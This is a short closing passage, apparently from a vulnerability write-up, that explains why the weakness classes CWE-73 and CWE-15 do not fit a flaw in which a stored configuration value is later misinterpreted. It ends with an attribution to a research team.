- CWE-73 and CWE-15 do not fit the configuration-file-mediated shape: the attacker controls neither a file path
  nor a configuration setting outside the intended interface. The write goes through a documented handler into
  a documented store; only the later interpretation of the stored value is wrong.

---

Written by the 0day Rubbish Research Team.
